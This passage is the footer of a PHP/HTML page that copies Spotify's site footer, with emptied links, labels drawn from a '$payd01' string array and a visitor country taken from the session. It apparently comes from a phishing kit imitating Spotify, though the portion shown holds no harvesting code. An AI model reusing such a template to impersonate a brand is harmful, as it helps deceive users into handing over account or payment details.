                        <path d="m810.1,92.31c-1.06-1.83-2.53-3.26-4.41-4.3-1.88-1.03-3.98-1.55-6.32-1.55s-4.44.52-6.32,1.55c-1.88,1.04-3.35,2.47-4.41,4.3-1.06,1.83-1.59,3.9-1.59,6.21s.53,4.34,1.59,6.17c1.06,1.83,2.53,3.26,4.41,4.3,1.88,1.04,3.98,1.55,6.32,1.55s4.44-.52,6.32-1.55,3.35-2.47,4.41-4.3c1.06-1.83,1.59-3.88,1.59-6.17s-.53-4.38-1.59-6.21Zm-1.93,11.36c-.86,1.52-2.06,2.7-3.59,3.56-1.53.85-3.27,1.28-5.2,1.28s-3.72-.43-5.25-1.28c-1.53-.85-2.72-2.04-3.57-3.56-.85-1.51-1.27-3.23-1.27-5.15s.42-3.63,1.27-5.13c.85-1.5,2.04-2.68,3.57-3.53,1.53-.85,3.28-1.28,5.25-1.28s3.67.43,5.2,1.28c1.53.85,2.73,2.04,3.59,3.56.86,1.52,1.29,3.23,1.29,5.15s-.43,3.59-1.29,5.11Z"></path>
                        <path d="m803.56,98.29c.82-.6,1.23-1.4,1.23-2.39s-.4-1.83-1.2-2.43c-.8-.6-1.96-.9-3.48-.9h-5.36v11.2h2.59v-4.45h1.41l3.41,4.45h3.18l-3.73-4.72c.79-.15,1.46-.4,1.96-.77Zm-3.86-.99h-2.36v-2.74h2.45c.73,0,1.29.11,1.68.34.39.23.59.58.59,1.06,0,.45-.21.79-.61,1.01-.41.23-.99.34-1.75.34Z"></path>
                      </g>
                    </svg> Spotify </span>
                </a>
              </div>
              <div class="mh-top-links svelte-1s7nb1t">
                <ul aria-label="Company" class="svelte-12qsmdh">
                  <h2 class="svelte-12qsmdh"><?php echo $payd01['s039']?></h2>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="about"><?php echo $payd01['s040']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="jobs"><?php echo $payd01['s041']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="press"><?php echo $payd01['s042']?></a>
                  </li>
                </ul>
                <ul aria-label="Communities" class="svelte-12qsmdh">
                  <h2 class="svelte-12qsmdh"><?php echo $payd01['s043']?></h2>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="artists"><?php echo $payd01['s044']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="developers"><?php echo $payd01['s045']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="advertising"><?php echo $payd01['s046']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="investors"><?php echo $payd01['s047']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="vendors"><?php echo $payd01['s048']?></a>
                  </li>
                </ul>
                <ul aria-label="Useful links" class="svelte-12qsmdh">
                  <h2 class="svelte-12qsmdh"><?php echo $payd01['s050']?></h2>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="help"><?php echo $payd01['s051']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="play"><?php echo $payd01['s05s']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="free"><?php echo $payd01['s052']?></a>
                  </li>
                </ul>
                <ul class="svelte-12qsmdh">
                  <h2 class="svelte-12qsmdh"><?php echo $payd01['s060x']?></h2>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="premium-individual-footer"><?php echo $payd01['s061x']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="premium-duo-footer"><?php echo $payd01['s062x']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="premium-family-footer"><?php echo $payd01['s063x']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="premium-student-footer"><?php echo $payd01['s064x']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="premium-free-footer"><?php echo $payd01['s065x']?></a>
                  </li>
                  <li class="svelte-12qsmdh">
                    <a href="" class="mh-footer-primary svelte-12qsmdh" data-ga-category="menu" data-ga-action="audiobooks-access-footer"><?php echo $payd01['s066x']?></a>
                  </li>
                </ul>
              </div>
              
              <div class="mh-country svelte-1s7nb1t">
                <a href="" class="mh-footer-secondary mh-compact svelte-1yztgzg" id>
                  <svg width="12" height="13" viewBox="0 0 12 13" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" class="svelte-184rsfv">
                    <path d="M6 0.624023C8.07255 0.624023 9.90309 1.68041 10.9815 3.28299C10.9819 3.28367 10.9822 3.28403 10.9825 3.28438C11.0029 3.30998 11.0209 3.33677 11.0363 3.36446C11.6453 4.30352 12 5.42315 12 6.62402C12 9.92265 9.32436 12.6079 6.02962 12.624C6.02732 12.6241 6.02495 12.6241 6.02258 12.6241L6 12.624C2.69149 12.624 0 9.93253 0 6.62402C0 3.31571 2.69149 0.624023 6 0.624023ZM6 1.78528C5.80411 1.78528 5.61089 1.79698 5.42102 1.81972C5.39755 1.91375 5.34896 2.0023 5.2765 2.07641L3.75157 3.63714C3.64024 3.75103 3.48978 3.812 3.33616 3.812C3.26752 3.812 3.19848 3.7998 3.1318 3.77483C2.91623 3.69359 2.76891 3.49277 2.75652 3.26265L2.74444 3.04725C1.77228 3.93289 1.16125 5.20844 1.16125 6.62402C1.16125 6.90513 1.18535 7.1807 1.23158 7.44881L2.11909 8.18538C2.12814 8.19266 2.13699 8.20053 2.14564 8.20859L2.91981 8.93437C2.99003 9.00007 3.04274 9.08228 3.07323 9.17374L3.37633 10.0793L3.83343 10.3016H4.86133C5.01514 10.3016 5.16285 10.3625 5.27182 10.4715L6.25621 11.4561C8.80567 11.3224 10.8387 9.20617 10.8387 6.62402C10.8387 5.8726 10.6666 5.16063 10.3596 4.52549L9.45716 5.24616L9.62455 5.6122C9.65956 5.68812 9.67726 5.77053 9.67726 5.85393V6.60784C9.67726 6.78014 9.60075 6.94358 9.46857 7.05393C9.3362 7.16407 9.16154 7.2103 8.99219 7.17902L8.05556 7.00751L8.52643 8.28855C8.58347 8.44354 8.57167 8.61544 8.49417 8.76139L7.67162 10.3097C7.58211 10.4783 7.41628 10.5907 7.22969 10.6136L7.15866 10.6179C6.94387 10.6179 6.74659 10.4991 6.64589 10.3093L6.25231 9.56742C6.24563 9.55444 6.23913 9.54126 6.23323 9.52788L5.91027 8.78833L5.5222 8.25412L4.15443 8.44118C4.0551 8.45475 3.9538 8.44255 3.86057 8.40518L2.68811 7.93765C2.46526 7.84855 2.3201 7.632 2.32244 7.39204L2.33879 5.84783C2.34095 5.65035 2.44304 5.46763 2.61022 5.3624L4.57554 4.12641C4.81058 3.97869 5.11781 4.01783 5.30801 4.22062L5.95905 4.91395L6.7818 5.23062L7.05303 5.13365L5.90181 3.48933C5.77849 3.3131 5.76256 3.08317 5.86051 2.89179L6.41732 1.80311C6.27976 1.7913 6.14057 1.78528 6 1.78528Z" fill="#8F8F8F"></path>
                  </svg>  <?php echo(isset($_SESSION['ip_countryName'])?$_SESSION['ip_countryName']:'')?> </a>
              </div>
              <div class="mh-bottom-links svelte-1s7nb1t">
                <ul class="svelte-19l7cif">
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s053']?></a>
                    </div>
                  </li>
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s056x']?></a>
                    </div>
                  </li>
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s054']?></a>
                    </div>
                  </li>
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s055']?></a>
                    </div>
                  </li>
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s056']?></a>
                    </div>
                  </li>
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s057x']?></a>
                    </div>
                  </li>
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s058x']?></a>
                    </div>
                  </li>
                  <li class="svelte-19l7cif">
                    <div class="link-wrapper svelte-and2gp">
                      <a href="/" class="mh-footer-secondary svelte-1yztgzg" id><?php echo $payd01['s059x']?></a>
                      <svg xmlns="http://www.w3.org/2000/svg" aria-labelledby="ccpa-svg-title" xml:space="preserve" style="enable-background:new 0 0 30 14" viewBox="0 0 30 14" class="svelte-n33a1d">
                        <title id="ccpa-svg-title">California Consumer Privacy Act (CCPA) Opt-Out Icon</title>
                        <path d="M7.4 12.8h6.8l3.1-11.6H7.4C4.2 1.2 1.6 3.8 1.6 7s2.6 5.8 5.8 5.8z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#fff"></path>
                        <path d="M22.6 0H7.4c-3.9 0-7 3.1-7 7s3.1 7 7 7h15.2c3.9 0 7-3.1 7-7s-3.2-7-7-7zm-21 7c0-3.2 2.6-5.8 5.8-5.8h9.9l-3.1 11.6H7.4c-3.2 0-5.8-2.6-5.8-5.8z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#06f"></path>
                        <path d="M24.6 4c.2.2.2.6 0 .8L22.5 7l2.2 2.2c.2.2.2.6 0 .8-.2.2-.6.2-.8 0l-2.2-2.2-2.2 2.2c-.2.2-.6.2-.8 0-.2-.2-.2-.6 0-.8L20.8 7l-2.2-2.2c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0l2.2 2.2L23.8 4c.2-.2.6-.2.8 0z" style="fill:#fff"></path>
                        <path d="M12.7 4.1c.2.2.3.6.1.8L8.6 9.8c-.1.1-.2.2-.3.2-.2.1-.5.1-.7-.1L5.4 7.7c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0L8 8.6l3.8-4.5c.2-.2.6-.2.9 0z" style="fill:#06f"></path>
                      </svg>
                    </div>
                  </li>
                </ul>
                <span class="svelte-1so9ic8"><?php echo $payd01['s057']?></span>
              </div>
    
            </nav>
          </footer>
        </div>
      </div>
    </div>

  </body>
</html>